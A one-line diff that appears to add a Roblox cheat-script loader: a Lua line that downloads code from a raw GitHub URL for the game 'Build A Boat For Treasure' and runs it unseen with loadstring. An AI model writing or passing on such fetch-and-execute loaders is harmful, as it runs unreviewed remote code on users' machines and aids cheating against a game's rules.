@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/spacex02/scripts/main/build-a-boat-for-treasure-25296'))()
